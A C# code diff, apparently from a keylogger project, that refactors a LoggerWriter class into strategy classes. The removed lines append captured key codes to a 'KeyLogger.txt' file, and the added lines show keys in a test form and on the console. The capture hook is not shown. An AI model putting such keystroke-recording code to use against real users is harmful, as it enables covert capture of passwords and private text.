@@ -11,30 +11,48 @@ namespace IP
 {
     public class LoggerWriter
     {
-        public static void WriteToLog(int vkCode, String path)
-        {
-            bool _isCapital = Control.IsKeyLocked(Keys.CapsLock);
+        private static ILoggerWriter _writer = new VKCodeStrategy();
 
-            using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "KeyLogger.txt"), true))
-            {
-                if(vkCode == 0x14) {}
-                else if (vkCode == 0x20) 
-                {
-                    outputFile.WriteAsync(" ");
-                }
-                else if (vkCode == 0x0D)
-                {
-                    outputFile.WriteAsync('\n' + "ENTER" + '\n');
-                }
-                else
-                {
-                    string s = ((Keys)vkCode).ToString();
-                    if (_isCapital)
-                        outputFile.WriteAsync(s);
-                    else
-                        outputFile.WriteAsync(s.ToLower());
-                }
-            }
+        void SetForm(TestUI form)
+        {
+
+        }
+
+        public void SetStrategy(ILoggerWriter strategy)
+        {
+            _writer = strategy;
+        }
+        public void HandleVK(int vkCode, String path, TestUI form)
+        {
+            _writer.WriteToLog(vkCode, path, form);
+        }
+    }
+
+    public class VKCodeStrategy : ILoggerWriter
+    {
+        public void WriteToLog(int vkCode, string path, TestUI form)
+        {
+            Console.WriteLine(vkCode);
+            form.KeyText.AppendText(vkCode+"");
+            
+        }
+    }
+
+    public class ToStringStrategy : ILoggerWriter
+    {
+        public void WriteToLog(int vkCode, string path, TestUI form)
+        {
+            Console.WriteLine((Keys)vkCode);
+            form.KeyText.AppendText((Keys)vkCode+"");
+        }
+    }
+
+    public class ToCharStrategy : ILoggerWriter
+    {
+        public void WriteToLog(int vkCode, string path, TestUI form )
+        {
+            Console.WriteLine((char)vkCode);
+            form.KeyText.AppendText((char)vkCode+"");
         }
     }
 }
